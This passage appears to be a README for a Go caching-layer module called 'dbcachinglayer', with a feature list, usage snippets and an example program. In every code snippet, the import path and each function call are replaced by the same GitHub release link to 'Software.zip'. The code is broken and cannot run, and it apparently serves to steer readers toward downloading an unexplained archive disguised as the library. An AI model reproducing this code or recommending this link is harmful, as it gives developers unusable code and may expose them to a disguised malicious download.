ðŸ”¹ **Concurrency Support**: Handles multiple concurrent requests efficiently and ensures thread safety.  
ðŸ”¹ **CRUD Operations**: Provides functionalities for creating, reading, updating, and deleting database records.  
ðŸ”¹ **Thread-Safe**: Implements mechanisms to maintain data integrity in multi-threaded environments.  
ðŸ”¹ **Persistence Layer**: Offers a seamless way to store and retrieve data from the database.

## Usage
Using the **dbcachinglayer** module in your Go application is simple. Start by importing the module into your code:

```go
import "https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip"
```

Next, initialize the caching layer and configure it according to your database settings:

```go
cache := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip()
https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key", "value")
```

You can now perform various CRUD operations using the caching layer:

```go
// Retrieve value
value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key")

// Update value
https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key", "new_value")

// Delete entry
https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key")
```

For more detailed usage instructions and examples, please refer to the documentation or examples section of this repository.

## Examples
Below is a simple example demonstrating the usage of the **dbcachinglayer** module:

```go
package main

import (
    "fmt"
    "https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip"
)

func main() {
    cache := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip()
    https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("name", "John Doe")

    if value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("name"); ok {
        https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("Name:", value)
    } else {
        https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("Name not found in cache")
    }
}
```

This example showcases basic operations like setting a value in the cache and retrieving it later.
